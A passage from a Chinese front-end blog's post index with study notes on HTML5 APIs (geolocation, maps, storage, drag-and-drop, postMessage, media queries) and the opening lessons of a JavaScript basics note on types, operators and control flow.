clearWatch examp01 getCurrentPosition 12&lt;button id=\"btn\"&gt;请求位置信息&lt;/button&gt;&lt;div id=\"box\"&gt;&lt;/div&gt; 1234567891011121314151617181920var btn = document.getElementById(\"btn\");var box = document.getElementById(\"box\"); btn.onclick = function()&#123; navigator.geolocation.getCurrentPosition(function(position)&#123; box.innerHTML +=\"经度：\"+position.coords.longitude + \"&lt;br&gt;\"; box.innerHTML +=\"纬度：\"+position.coords.latitude + \"&lt;br&gt;\"; box.innerHTML +=\"海拔：\"+position.coords.accuracy + \"&lt;br&gt;\"; box.innerHTML +=\"海拔的准确度：\"+position.coords.altitudeAccuracy + \"&lt;br&gt;\"; box.innerHTML +=\"地面速度\"+position.coords.speed + \"&lt;br&gt;\"; box.innerHTML +=\"行进方向\"+position.coords.heading + \"&lt;br&gt;\"; box.innerHTML +=\"请求时间\"+new Date(position.timestamp) + \"&lt;br&gt;\"; &#125;,function(err)&#123; alert(err.code); &#125;,&#123; enableHighAccuracy:false,//精确请求 timeout:5000,//设置超时 maximumAge:1000//缓存时间 &#125;); &#125; 在线演示 examp02 1234567891011121314151617181920var btn = document.getElementById(\"btn\");var box = document.getElementById(\"box\"); btn.onclick = function()&#123; navigator.geolocation.watchPosition(function(position)&#123; box.innerHTML +=\"经度：\"+position.coords.longitude + \"&lt;br&gt;\"; box.innerHTML +=\"纬度：\"+position.coords.latitude + \"&lt;br&gt;\"; box.innerHTML +=\"海拔：\"+position.coords.accuracy + \"&lt;br&gt;\"; box.innerHTML +=\"海拔的准确度：\"+position.coords.altitudeAccuracy + \"&lt;br&gt;\"; box.innerHTML +=\"地面速度\"+position.coords.speed + \"&lt;br&gt;\"; box.innerHTML +=\"行进方向\"+position.coords.heading + \"&lt;br&gt;\"; box.innerHTML +=\"请求时间\"+new Date(position.timestamp) + \"&lt;br&gt;\"; &#125;,function(err)&#123; alert(err.code); &#125;,&#123; enableHighAccuracy:false,//精确请求 timeout:5000,//设置超时 maximumAge:1000//缓存时间 &#125;); &#125; 在线演示 example03 高德地图应用 123456#container &#123; width:600px; height: 300px; margin:40px auto; border:1px solid red;&#125; 1234&lt;div id=\"container\"&gt;&lt;/div&gt; &lt;script type=\"text/javascript\" src=\"http://webapi.amap.com/maps?v=1.3&amp;key=278b7b8b4728ba302b7e566fc2a97b36\"&gt;&lt;/script&gt; 1var map = new AMap.Map('container'); 在线演示 examp04 搜索城市 1234567891011121314151617181920212223242526272829303132#container &#123;width:500px; height:500px; margin:100px auto;&#125; .menu&#123; width:100px; box-shadow: 0 0 5px #000; margin:auto; background:#fff;&#125;.menu ul li&#123; list-style:none; line-height:30px; text-align:center; cursor:pointer;&#125;#box&#123; width:400px; height:40px; position:absolute; top:150px; left:50%; margin-left:-200px; background:#fff; box-shadow:0 0 10px #000;&#125;input&#123; height:38px; width:300px; border:none; outline:none;&#125;#btn&#123; width:80px;&#125; 12345678&lt;div id=\"container\"&gt;&lt;/div&gt; &lt;div id=\"box\"&gt; &lt;input type=\"text\" id=\"city\" placeholder=\"请输入城市...\"&gt; &lt;input type=\"button\" value=\"搜索\" id=\"btn\"&gt;&lt;/div&gt;&lt;script type=\"text/javascript\" src=\"http://webapi.amap.com/maps?v=1.3&amp;key=278b7b8b4728ba302b7e566fc2a97b36\"&gt;&lt;/script&gt; 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849var btn = document.getElementById(\"btn\");var city = document.getElementById(\"city\");var map = new AMap.Map('container');var toolBar,mouseTool,contextMenu;//在地图中添加操作toolBar插件、mouseTool插件map.plugin([\"AMap.ToolBar\",\"AMap.MouseTool\"],function()&#123; toolBar = new AMap.ToolBar(); map.addControl(toolBar); mouseTool = new AMap.MouseTool(map);&#125;);var menuContext = document.createElement(\"div\");menuContext.innerHTML = \"&lt;div class=menu&gt;&lt;ul&gt;&lt;li onclick='zoomMenu(0)'&gt;缩小&lt;/li&gt;&lt;li onclick='zoomMenu(1)'&gt;放大&lt;/li&gt;&lt;li onclick='distanceMeasureMenu()'&gt;距离量测&lt;/li&gt;&lt;li onclick = 'addMarkerMenu()'&gt;添加标记&lt;/li&gt;&lt;/ul&gt;&lt;/div&gt;\";//创建一个自定义的右键菜单contextMenu = new AMap.ContextMenu(&#123;isCustom:true,content:menuContext&#125;);//给地图绑鼠标右键功能弹出右键菜单AMap.event.addListener(map,\"rightclick\",function(e)&#123; contextMenu.open(map,e.lnglat);//e.lnglat鼠标点击的经纬度 contextMenuPosition = e.lnglat;&#125;)//右键菜单缩放地图function zoomMenu(n)&#123; if(n === 0)&#123;map.zoomOut();&#125; if(n === 1)&#123;map.zoomIn();&#125; contextMenu.close();&#125;contextMenu.close();//测量距离功能function distanceMeasureMenu()&#123; mouseTool.rule(); contextMenu.close();&#125;//添加标注功能function addMarkerMenu()&#123; mouseTool.close(); var marker = new AMap.Marker(&#123; map: map, position: contextMenuPosition, //基点位置 offset: &#123;x:-5,y:-10&#125; //相对于基点位置 &#125;); contextMenu.close();&#125;//搜索城市btn.onclick = function()&#123; var val = city.value; map.setCity(val);&#125; 在线演示 本地存储 Storage sessionStorage session临时回话，从页面打开到页面关闭的时间段 窗口的临时存储，页面关闭，本地存储消失 localStorage 永久存储（可以手动删除数据） Storage的特点 存储量限制 ( 5M ) 客户端完成，不会请求服务器处理 sessionStorage数据是不共享、 localStorage共享 Storage API setItem(): 设置数据，(key,value)类型，类型都是字符串 可以用获取属性的形式操作 getItem(): 获取数据，通过key来获取到相应的value removeItem(): 删除数据，通过key来删除相应的value clear(): 删除全部存储的值 存储事件: 当数据有修改或删除的情况下，就会触发storage事件 在对数据进行改变的窗口对象上是不会触发的` Key : 修改或删除的key值，如果调用clear(),key为null newValue : 新设置的值，如果调用removeStorage(),key为null oldValue : 调用改变前的value值 storageArea : 当前的storage对象 url : 触发该脚本变化的文档的url 注：session同窗口才可以,例子：iframe操作 第十六课 HTML5新增JS方法 新增选择器 document.querySelector() 选择单个元素 document.querySelectorAll() 选择所有的 document.getElementsByClassName() 通过类名选择 延迟加载JS JS的加载会影响后面的内容加载 很多浏览器都采用了并行加载JS，但还是会影响其他内容 Html5的defer和async defer=“defer ”: 延迟加载，会按顺序执行，在onload执行前被触发 async =“async”: 异步加载，加载完就触发，有顺序问题 浏览器兼容性：Labjs库 123456789101112131415161718192021222324252627282930/*** 动态加载script文件 （推荐方法） 只需请求一次 可加载多个JavaScript文件，减少请求次数以及页面的加载阻塞*/function loadScript(url,callback)&#123; var script = document.createElement(\"script\"); script.type = \"text/javascript\"; if(script.readyState)&#123;//IE script.onreadystatechange = function()&#123; if(script.readyState == \"loaded\" || script.readyState == \"complete\")&#123; onreadystatechange = null; callback(); &#125; &#125; &#125;else &#123; script.onload = function()&#123; callback(); &#125; &#125; script.src = url; document.getElementsByTagName(\"head\")[0].appendChild(script);&#125;loadScript(\"js/defer.js\",function()&#123; console.log(\"加载成功\"); // 加载成功回调&#125;);loadScript(\"js/async.js\",function()&#123; console.log(\"加载成功\"); // 加载成功回调&#125;); 获取class列表属性 classList length : class的长度 add() : 添加class方法 remove() : 删除class方法 toggle() : 切换class方法 contains() : 判断类名是否存在返回bool值 JSON的新方法 parse() : 把字符串转成json 字符串中的属性要严格的加上引号 stringify() : 把json转化成字符串 会自动的把双引号加上 与eval的区别 eval()：对任何的字符串进行解析变成js parse()：字符串中的属性要严格的加上引号 其他浏览器兼容 去下载json2.js 历史管理 onhashchange ：改变hash值来管理 history ： 服务器下运行 pushState : 三个参数 ：数据 标题(都没实现) 地址(可选) onpopstate事件 : 读取数据 event.state 第十七课 HTML5拖拽事件 图片自带拖拽功能 其他元素可设置draggable属性 draggable ：true 拖拽元素(被拖拽元素对象)事件 : ondragstart : 拖拽前触发 ondrag :拖拽前、拖拽结束之间，连续触发 ondragend :拖拽结束触发 目标元素(拖拽元素被拖到的对象)事件 : ondragenter :进入目标元素触发 ondragover:进入目标、离开目标之间，连续触发 ondragleave :离开目标元素触发 ondrop :在目标元素上释放鼠标触发 需要在ondragover事件里面阻止默认事件 拖拽兼容问题 火狐浏览器下需设置dataTransfer对象才可以拖拽除图片外的其他标签 dataTransfer对象 setData() : 设置数据 key和value(必须是字符串) getData() : 获取数据，根据key值，获取对应的value effectAllowed : 设置光标样式(none, copy, copyLink, copyMove, link, linkMove,move, all 和uninitialized) setDragImage ：三个参数（指定的元素，坐标X，坐标Y） files： 获取外部拖拽的文件，返回一个filesList列表 filesList下有个type属性，返回文件的类型 读取文件信息 FileReader(读取文件信息) readAsDataURL 参数为要读取的文件对象 onload当读取文件成功完成的时候触发此事件 this. result 获取读取的文件数据 examp01 拖拽案例 12&lt;div id=\"drap\" draggable=\"true\"&gt;&lt;/div&gt;&lt;div id=\"box\"&gt;&lt;/div&gt; 1234567891011#drap &#123; width: 100px; height: 100px; background: red;&#125;#box &#123; width: 500px; height: 500px; border: 2px solid blue; margin: 50px auto;&#125; 123456789101112131415161718192021222324252627282930313233343536373839404142//被拖拽元素事件drap.ondragstart = function(ev)&#123; // 拖拽前 var ev = ev || window.event; //火狐浏览器下需设置dataTransfer对象才可以拖拽除图片外的其他标签 ev.dataTransfer.setData(\"key\",\"poetries\"); //effectAllowed : 设置光标样式(none, copy, copyLink, copyMove, link, linkMove,move, all 和uninitialized) ev.dataTransfer.effectAllowed = \"copy\"; //设置被拖拽的小元素 setDragImage ：三个参数（指定的元素，坐标X，坐标Y） ev.dataTransfer.setDragImage(pic,25,25); this.style.background = \"green\";&#125;drap.ondrag = function()&#123; // 拖拽过程中 this.innerText = \"被拖拽中...\";&#125;drap.ondragend = function()&#123; // 拖拽结束 this.style.background = \"red\"; this.innerHTML = \"\";&#125;//目标元素事件box.ondragenter = function()&#123; //进入目标元素触发 this.innerHTML = \"可将文件拖放到这里!\";&#125;box.ondragover = function(ev)&#123; //进入目标、离开目标之间，连续触发 var ev = ev || window.event; ev.preventDefault(); this.style.background = \"pink\";&#125;box.ondragleave = function()&#123; //离开目标元素触发 this.innerHTML = \"\"; this.style.background = \"none\";&#125;box.ondrop = function(ev)&#123;//在目标元素上释放鼠标触发 //alert(\"拖放结束\") this.innerHTML = ev.dataTransfer.getData(\"key\");&#125; 在线演示 example02 拖拽相册 123&lt;h1&gt;请拖拽图片到红框中&lt;/h1&gt;&lt;div id=\"box\"&gt;&lt;span&gt;可以将文件拖放到这里！！&lt;/span&gt;&lt;/div&gt;&lt;div id=\"dustbin\"&gt;垃圾回收站&lt;/div&gt; 1234567891011121314151617181920212223242526272829303132#box&#123; position:relative; width:500px; height:500px; border:2px solid red; margin:100px auto 0px; &#125;#box span&#123; position:absolute; left:0; top:0; right:0; bottom:0; height:50px; width:192px; margin:auto; display:none;&#125;img&#123; width:100px;height:100px;&#125;#dustbin&#123; width:200px; height:100px; background:#000; color:#fff; font-size:40px; text-align:center; line-height:100px; margin:auto;&#125; 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869var box = document.getElementById(\"box\");var dusTbin = document.getElementById(\"dustbin\");var span = box.getElementsByTagName(\"span\")[0];//目标元素事件var img = '';box.ondragenter = function()&#123;//进入目标元素触发 span.style.display = \"block\";&#125;box.ondragover = function(ev)&#123;//在目标元素上连续触发 var ev = ev||window.event; ev.preventDefault();//阻止默认事件 span.style.display = \"block\";&#125;box.ondragleave = function()&#123;//离开目标元素 span.style.display = \"none\";&#125;box.ondrop = function(ev)&#123;//在目标元素上面释放鼠标触发 //alert(\"拖拽结束！！\"); var ev = ev||window.event; ev.preventDefault();//阻止默认事件 span.style.display = \"none\"; var file = ev.dataTransfer.files; //alert(file[0].type); for (var i=0; i&lt;file.length ;i++ ) &#123; if (file[i].type.indexOf(\"image\")!=-1) &#123; var read = new FileReader();//新建一个读取文件对象 read.readAsDataURL(file[i]);//读取文件 read.onload = function()&#123;//读取文件成功之后调用什么函数 var img = document.createElement(\"img\"); //alert(this.result); img.src = this.result; box.appendChild(img); //获取img节点 实现删除功能 var oImg = document.getElementsByTagName(\"img\"); if (oImg) &#123; for (var j=0;j&lt;oImg.length ;j++ ) &#123; oImg[j].ondragstart = function(ev)&#123; ev.dataTransfer.setData(\"data\",ev.target.innerHTML); img = ev.target; &#125; oImg[j].ondragend = function(ev)&#123; ev.dataTransfer.clearData(\"data\");//清楚数据 img = null; &#125; &#125; &#125; //实现删除功能(移除img节点) dusTbin.ondragover = function(ev)&#123; ev.preventDefault(); &#125; dusTbin.ondrop = function()&#123; if (img) &#123; img.parentNode.removeChild(img); &#125; &#125; &#125; &#125;else&#123; alert(\"请上传图片！\"); &#125; &#125; &#125; 在线演示 example03 拖拽排序 123456789101112&lt;div class=\"wrap\" id=\"wrap\"&gt; &lt;ul id=\"box\"&gt; &lt;li style=\"background:#f3f\" draggable=\"true\"&gt;1&lt;/li&gt; &lt;li style=\"background:#ff6\" draggable=\"true\"&gt;2&lt;/li&gt; &lt;li style=\"background:#c60\" draggable=\"true\"&gt;3&lt;/li&gt; &lt;li style=\"background:#903\" draggable=\"true\"&gt;4&lt;/li&gt; &lt;li style=\"background:#0f6\" draggable=\"true\"&gt;5&lt;/li&gt; &lt;li style=\"background:#636\" draggable=\"true\"&gt;6&lt;/li&gt; &lt;li style=\"background:#36f\" draggable=\"true\"&gt;7&lt;/li&gt; &lt;li style=\"background:#033\" draggable=\"true\"&gt;8&lt;/li&gt; &lt;/ul&gt;&lt;/div&gt; 123456789101112131415.wrap&#123; width:500px; height:500px; margin:50px auto;&#125;ul li&#123; list-style:none; width:500px; height:50px; color:#fff; text-align:center; line-height:50px; font-size:40px; font-weight:bold;&#125; 1234567891011121314151617181920212223242526272829303132333435363738394041424344var oUl = document.getElementById(\"box\");var oLi = oUl.getElementsByTagName(\"li\");var curr = 0;function sort()&#123; for (var i = 0;i &lt; oLi.length;i++) &#123; oLi[i].index = i; oLi[i].ondragstart = function(ev)&#123; var ev = ev || window.event; ev.dataTransfer.setData(\"data\",this.innerHTML); //this.innerHTML = \"被拖拽中...\"; curr = this.index; &#125; oLi[i].ondragenter = function()&#123; for(var i = 0;i &lt; oLi.length;i++)&#123; oLi[i].style.border = \"none\"; &#125; if(curr != this.index)&#123; this.style.border = \"2px solid #000\"; &#125; &#125; oLi[i].ondragover = function(e)&#123; var e = e || window.event; e.preventDefault(); &#125; oLi[i].ondrop = function(ev)&#123; //鼠标释放的时候 //oUl.insertBefore(oLi[curr],this);//insertBefore(新节点，目标节点) inserAfter(oLi[curr],this); this.style.border = \"none\"; //oLi[curr].innerHTML = ev.DataTransfer.getData(\"data\"); sort(); &#125; &#125;&#125;sort();function inserAfter(newItem,targerItem)&#123; var parentItem = targerItem.parentNode; if(parentItem.lastChild == targerItem)&#123; parentItem.appendChild(newItem); &#125;else &#123; parentItem.insertBefore(newItem,targerItem.nextSibling); &#125;&#125; 在线演示 第十八课 跨文档操作 跨文档请求 同域跨文档 iframe内页： 父页面操作子页面：contentWindow 子页面操作父页面：window.top(找到最顶级的父页面)/parent(第一父页面) 新窗口页： 父页面操作子页面：window.open 子页面操作父页面：window.opener 不同域跨文档 postMessage（“发送的数据”,”接收的域”） message事件监听 ev.origin发送数据来源的域 ev.data 发送的数据 通过判断发送的数据来执行相应的需求 ajax跨域 XMLHttpRequest 新增功能 跨域请求：修改服务端头信息 IE兼容：XDomaiRequest 进度事件： upload.onprogress(ev) 上传进度(实现文件上传进度条) ev.total 发送文件的总量 ev.loaded 已发送的量 FormData 构建提交二进制数据 拓展阅读 HTML5 API 大盘点 附录一 css3响应式布局 媒体类型 *all 所有媒体 braille 盲文触觉设备 embossed 盲文打印机 *print 手持设备 projection 打印预览 *screen 彩屏设备 speech ‘听觉’类似的媒体类型 tty不适用像素的设备 tv 电视 关键字 and not not关键字是用来排除某种制定的媒体类型 only only用来定某种特定的媒体类型 媒体特性 (max-width:600px) (max-device-width: 480px) 设备输出宽度 (orientation:portrait) 竖屏 (orientation:landscape) 横屏 (-webkit-min-device-pixel-ratio: 2) 像素比 devicePixelRatio 设备像素比 window.devicePixelRatio = 物理像素 / dips 样式引入 1&lt;link rel=\"stylesheet\" href=\"css/index.css\" media=\"print\" /&gt; 12@import url(\"css/demo.css\") screen;@media screen&#123; &#125; 12&lt;link rel=”stylesheet” media=”all and (orientation:portrait)” href=”portrait.css”&gt; 12&lt;link rel=”stylesheet” media=”all and (orientation:landscape)”href=”landscape.css”&gt; 1@media screen and (min-width:360px) and (max-width:500px) &#123;&#125; 12&lt;link rel=\"stylesheet\" type=\"text/css\" href=\"indexA.css\" media=\"screen and (min-width: 800px)\"&gt; 12&lt;link rel=\"stylesheet\" type=\"text/css\" href=\"indexB.css\" media=\"screen and (min-width: 600px) and (max-width: 800px)\"&gt; 12&lt;link rel=\"stylesheet\" type=\"text/css\" href=\"indexC.css\" media=\"screen and (max-width: 600px)\"&gt; 附录二 HTML5速查表 可以查阅支持H5+CSS3的属性 HTML5 标签含义之元素周期表 HTML5标签速查表 展示 flexbox 属性的作用–推荐 Flexbox 视觉指南–更好更容易地理解 Flexbox 某个属性的作用 本文md文件-仅供参考","categories":[{"name":"Front-End","slug":"Front-End","permalink":"https://ru23.com/categories/Front-End/"}],"tags":[{"name":"HTML5","slug":"HTML5","permalink":"https://ru23.com/tags/HTML5/"},{"name":"CSS3","slug":"CSS3","permalink":"https://ru23.com/tags/CSS3/"}]},{"title":"javascript笔记总结篇","slug":"2016-07-javascript笔记基础总结篇","date":"2016-09-24T02:33:00.000Z","updated":"2018-10-24T03:46:01.731Z","comments":true,"path":"note/5f0d48ef.html","link":"","permalink":"https://ru23.com/note/5f0d48ef.html","excerpt":"转载请声明出处 博客原文 随手翻阅以前的学习笔记，顺便整理一下放在这里，方便自己复习，也希望你有也有帮助吧 第一课时 入门基础 知识点： 操作系统就是个应用程序 只要是应用程序都要占用物理内存 浏览器本身也是一个应用程序 浏览器本身只懂得解析HTML 调用浏览器这个应用程序的一个功能绘制","text":"转载请声明出处 博客原文 随手翻阅以前的学习笔记，顺便整理一下放在这里，方便自己复习，也希望你有也有帮助吧 第一课时 入门基础 知识点： 操作系统就是个应用程序 只要是应用程序都要占用物理内存 浏览器本身也是一个应用程序 浏览器本身只懂得解析HTML 调用浏览器这个应用程序的一个功能绘制 1、javascript介绍 JavaScript操作DOM的本质是=获取+触发+改变 目的：就是用来操作内存中的DOM节点 修改DOM节点的属性 过javascript语法组织逻辑代码操作DOM BOM(window)它包含了DOM DOM(document) script脚本推荐放在最下边好处：防止因网络问题，页面加载时间长，出现空白；即便网络问题，浏览器也把DOM加载渲染完成，等待从服务端下载完js脚本，出现效果 css不放在最下面原因通俗地讲：好比先穿好衣服在出去，浏览器先把css样式准备好，在加载结构层，使得页面有样子；如果放在下面，因为页面是从上往下加载，没有css，就剩下裸露的标签，很难看，使得用户体验不好 2、基于对象的内存管理 javascript就是来操作这些对象 通过逻辑组织对象之间的关系和行为 如何操作这些对象？通过变量引用 3、变量 变量本质是一个空盒子，里面记录了一个内存地址，使能找到内存中的对象，保存了指向具体的实在的东西的地址 变量存在栈中，对象存在堆中 变量的意义：方便我们去操作对象 变量的几种引用方式 指针（C语言中叫法） 引用（Java） 变量 例如： var b = document.body 含义：把body这个对象在内存中的地址放到b变量里面，变量b（b是内存地址的别名）本身也存在内存中，以后的操作是针对body这个地址 变量命名规范 由字母(a-zA-Z)数字(0-9)下划线(_)以及美元符号($) 不能由数字开头 命名尽量用英文并且具有一定的含义 如果有多个英文单词,后面单词的首字母大写 不能使用关键字 首字母不要大写，大写是有特殊含义的 DOM在内存中的一些图示 DOM Tree DOM内存图 DOM内存图 DOM内存图 第二课时 回顾上节： 1、javascript介绍 2、基于对象的内存管理 javascript就是来操作这些对象 通过逻辑组织对象之间的关系和行为 如何操作这些对象？通过变量引用 3、变量 知识点： 1、window作用域 只要在script标签中定义的变量，默认就在window的作用域之下 默认就是window这个对象里面写代码 2、数据类型 如何判断js中的数据类型： typeof、instanceof、 constructor、 prototype方法比较 如何判断js中的类型呢，先举几个例子： 123456var a = \"iamstring.\";var b = 222;var c= [1,2,3];var d = new Date();var e = function()&#123;alert(111);&#125;;var f = function()&#123;this.name=\"22\";&#125;; 最常见的判断方法：typeof 123456alert(typeof a) ------------&gt; stringalert(typeof b) ------------&gt; numberalert(typeof c) ------------&gt; objectalert(typeof d) ------------&gt; objectalert(typeof e) ------------&gt; functionalert(typeof f) ------------&gt; function 其中typeof返回的类型都是字符串形式，需注意，例如： 12alert(typeof a == \"string\") -------------&gt; truealert(typeof a == String) ---------------&gt; false 另外typeof可以判断function的类型；在判断除Object类型的对象时比较方便。 判断已知对象类型的方法：instanceof 1234alert(c instanceof Array) ---------------&gt; truealert(d instanceof Date) alert(f instanceof Function) ------------&gt; truealert(f instanceof function) ------------&gt; false 注意：instanceof后面一定要是对象类型，并且大小写不能错，该方法适合一些条件选择或分支。 根据对象的constructor判断：constructor 123alert(c.constructor === Array) ----------&gt; truealert(d.constructor === Date) -----------&gt; truealert(e.constructor === Function) -------&gt; true 注意： constructor 在类继承时会出错 例子： 123456function A()&#123;&#125;;function B()&#123;&#125;;A.prototype = new B(); //A继承自Bvar aObj = new A();alert(aobj.constructor === B) -----------&gt; true;alert(aobj.constructor === A) -----------&gt; false; 而instanceof方法不会出现该问题，对象直接继承和间接继承的都会报true： 12alert(aobj instanceof B) ----------------&gt; true;alert(aobj instanceof B) ----------------&gt; true; 言归正传，解决construtor的问题通常是让对象的constructor手动指向自己： 123aobj.constructor = A; //将自己的类赋值给对象的constructor属性alert(aobj.constructor === A) -----------&gt; true;alert(aobj.constructor === B) -----------&gt; false; //基类不会报true了; 通用但很繁琐的方法： prototype 123456alert(Object.prototype.toString.call(a) === ‘[object String]’) -------&gt; true;alert(Object.prototype.toString.call(b) === ‘[object Number]’) -------&gt; true;alert(Object.prototype.toString.call(c) === ‘[object Array]’) -------&gt; true;alert(Object.prototype.toString.call(d) === ‘[object Date]’) -------&gt; true;alert(Object.prototype.toString.call(e) === ‘[object Function]’) -------&gt; true;alert(Object.prototype.toString.call(f) === ‘[object Function]’) -------&gt; true; 大小写不能写错，比较麻烦，但胜在通用。 通常情况下用typeof判断就可以了，遇到预知Object类型的情况可以选用instanceof或constructor方法 Javascript的数据类型有六种（ES6新增了第七种Symbol） 数值（number）：整数和小数（比如1和3.14） 字符串（string）：字符组成的文本（比如”Hello World”） 布尔值（boolean）：true（真）和false（假）两个特定值 undefined：表示 未定义 或不存在，即此处目前没有任何值 null：表示空缺，即此处应该有一个值，但目前为空 对象（object）：各种值组成的集合 通常，我们将数值、字符串、布尔值称为原始类型（primitive type）的值，即它们是最基本的数据类型，不能再细分了。而将对象称为合成类型（complex type）的值，因为一个对象往往是多个原始类型的值的合成，可以看作是一个存放各种值的容器。至于undefined和null，一般将它们看成两个特殊值 内存中一共分为几种对象： 变量 DOM对象 常量 自定义对象 数据类型转换 转换函数 toString() 转换为字符串，在JavaScript中所有数据类型都可以转换为string类型 12345678910var n1 = 12;var n2 = true;var a = [1, 2, 3];var o = &#123;&#125;;function f()&#123;&#125;n1.toString(); //\"12\"n2.toString(); //\"true\"a.toString(); //\"1,2,3\"o.toString(); //\"[object Object]\"f.toString(); //\"function f()&#123;&#125;\" parseInt()解析出一个string或者number类型的整数部分，如果没有可以转换的部分，则返回NaN（not a number） 123456var n1 = \"12\";var n2 = \"23hello\";var n3 = \"hello\";parseInt(n1); //12parseInt(n2); //23parseInt(n3); //NaN parseFloat()解析出一个string的浮点数部分，如果没有可以转换的部分，则返回NaN（not a number） 123456var n1 = \"1.2.3\";var n2 = \"1.2hello\"var n3 = \"hello\"parseFloat(n1); //1.2parseFloat(n2); //1.2parseFloat(n3); //NaN 强制类型转换 Boolean(value)- 把给定的值转换成Boolean型 123456Boolean(123); //trueBoolean(\"\"); //falseBoolean([]); //trueBoolean(&#123;&#125;); //trueBoolean(null); //falseBoolean(undefined); //false Number(value)-把给定的值转换成数字（可以是整数或浮点数） 12345678Number(\"123\"); //123Number(\"123h\"); //NaNNumber(true); //1Number(false); //0Number(undefined); //NaNNumber(null); //0Number([]); //0Number(&#123;&#125;); //NaN String(value)- 把给定的值转换成字符串 12345String(123); //\"123\"String([1,2]); //\"1,2\"String(undefined) //\"undefined\"String(null) //\"null\"String(&#123;&#125;) //\"[object Object]\" 隐式转换 数字＋字符串：数字转换为字符串 console.log(12+&quot;12&quot;); //1212 数字＋布尔值：true转换为1，false转换为0 console.log(12+true); //13 字符串＋布尔值：布尔值转换为true或false console.log(&quot;hello&quot;+true); //hellotrue 布尔值＋布尔值 console.log(true+true); //2 null和undefined undefined 表示一种未知状态，声明了但没有初始化的变量，变量的值时一个未知状态。访问不存在的属性或对象window.xxx）方法没有明确返回值时，返回值是一个undefined.当对未声明的变量应用typeof运算符时，显示为undefined。 null表示尚未存在的对象,null是一个有特殊意义的值。可以为变量赋值为null，此时变量的值为“已知状态”(不是undefined)，即null。（用来初始化变量，清除变量内容，释放内存） 12undefined==null //结果为true,但含义不同。undefined===null //false,两者类型不一致，前者为“undefined”，后者为“object” 3、javascript脚本执行顺序 第一步定义： 分为var定义 和函数定义function 第二步执行： 其他所有 先从上往下定义完所有的后，再从上往下执行 除了var function定义外的 其他都是执行 如：赋值 函数调用 在栈里面找到的，就不去堆里面找，因为栈空间小，就近原则【总之：先在栈里面找，找不到再去堆里面找】在栈里面开辟，就能找到堆里面的地址 如：var b = function(){} 总结一下==运算的规则：(隐式转换) JS中的值有两种类型：原始类型(Primitive)、对象类型(Object)。 原始类型包括：Undefined、Null、Boolean、Number和String等五种。 Undefined类型和Null类型的都只有一个值，即undefined和null；Boolean类型有两个值：true和false；Number类型的值有很多很多；String类型的值理论上有无数个。 所有对象都有valueOf()和toString()方法，它们继承自Object，当然也可能被子类重写 undefined == null，结果是true。且它俩与所有其他值比较的结果都是false。 String == Boolean，需要两个操作数同时转为Number。 String/Boolean == Number，需要String/Boolean转为Number。 Object == Primitive，需要Object转为Primitive(具体通过valueOf和toString方法) 第三课时 上节回顾： 1、window作用域 只要在script标签中定义的变量，默认就在window的作用域之下 默认就是window这个对象里面写代码 2、数据类型 number:数字 string:字符类型，必须用引号引起来 boolean:布尔类型 true false null:变量引用了一块堆中一个空的空间 object:引用对象类型（存在于堆里面） array:数组类型 function:函数数据类型 对象数据类型： object,array,function 3、javascript脚本执行顺序 定义 var function 执行 其他所有 知识点： 1、运算符 算术运算符(+,-,*,/,%,++,--) 如果引用所指的地方是null的话，那么在运算中就会自动变成0 %运算符 如：4%5取模 模是4 7%5取模 模是7-5=2 字符串和数字相加的情况： 左右都是数字：数字相加 左右有一个字符串：字符串拼接 左右边有一个null:null看做0 左右边有一个undefined：结果是NAN（not is number） 赋值运算符(=,-=,+=,*=,/=,%=) 比较运算符(==,===,!=,&gt;,&lt;,&gt;=,&lt;=) 先执行表达式计算再赋值 ==和!=在比较之前首先让双方的值做隐士类型转换，===不转换 逻辑运算符(||,&amp;&amp;,!) || 在js中和PHP中是不一样的 js中返回逻辑或的左边或右边的一个结果 PHP返回||或出来以后的结果即：true false 特殊性（注意）—一定要记住（这个特性和其他编程语言不一样）：在js里返回不是布尔值 || 短路运算 第一个条件为真 后面不执行 &amp;&amp;把表达式最后一个值返回（注意这里） 条件运符(表达式1?表达式2:表达式3)三元运算符 表达式1?表达式2:表达式3 表达式1为真 返回表达式2 否则返回表达式3 三元运算符 可以多层次嵌套使用 2、在js中 有四种被认为是非： undefined null false 0 例子：var age = prompt(&quot;温馨提示：&quot;,&quot;请输入您的年龄&quot;)||0 当点击取消的时候，如果出现undefined null fasle 0 表示非的逻辑 那么||就会过滤，取右边的值0 第四课时 上节回顾： 1、运算符 算术运算符(+,-,*,/,%,++,--) 如果+号左边和右边有一边是字符串类型的数据的话，这个时候就变成字符串拼接 var str = &quot;你好&quot;+123;//你好123 var count = 2; var str1 = &quot;你叫了我第&quot;-count+&quot;次&quot;;//你叫了我第2次 如果引用所指的地方是null的话，那么在运算中就会自动变成0 2、赋值运算符*(=,-=,+=,`=,/=,%=`) 3、 比较运算符(==,===,!=,&gt;,&lt;,&gt;=,&lt;=) 先执行表达式计算再赋值 ==和!=在比较之前首先让双方的值做隐士类型转换，===不转换 4、逻辑运算符(||,&amp;&amp;,!) 5、条件运算符(1&gt;2?3:4) 知识点： 1、console.log调试程序 开发中大量使用这个 而不用alert 2、条件结构 if javascript中if语句优化写法 使用常见的三元操作符 123if (foo) bar(); else baz(); ==&gt; foo?bar():baz();if (!foo) bar(); else baz(); ==&gt; foo?baz():bar();if (foo) return bar(); else return baz(); ==&gt; return foo?bar():baz(); 使用and(&amp;&amp;)和or(||)运算符 12if (foo) bar(); ==&gt; foo&amp;&amp;bar();if (!foo) bar(); ==&gt; foo||bar(); if...else if...else if...else 当通过判断返回某个值的时候，优先使用三元表达式 当通过判断执行N段逻辑代码的时候，只能用条件结构 第五课时 上节回顾： 1、console.log调试程序 2、条件结构 if if...else if...else if...else 当通过判断返回某个值的时候，优先使用三元表达式 当通过判断执行N段逻辑代码的时候，只能用条件结构 知识点： 1、switch switch case break default 条件 判断 退出 默认 a.只要匹配上一个case，那么它下面的所有的case都会执行包括default b.break的意思跳出当前结构 2、for 循环有三个要素 a.循环变量 b.判断（循环体） c.改变循环变量 d.continue的意思结束本次循环进入下次循环 continue 结束本次循环，继续下一次循环 当前这次循环不做 直接做下面的 break 结束后面的循环不做了 第六课时 上节回顾： 1、switch switch case break default 条件 判断 退出 默认 a.只要匹配上一个case，那么它下面的所有的case都会执行包括default b.break的意思跳出当前结构 2、for 循环有三个要素 a.循环变量 b.判断条件（循环体） c.改变循环变量 d.continue的意思结束本次循环进入下次循环 知识点： 1、while/do...while 没有谁好谁坏 只有适应场景不同 比如：先吃饭 在买单 do..while 用户体验高 有风险 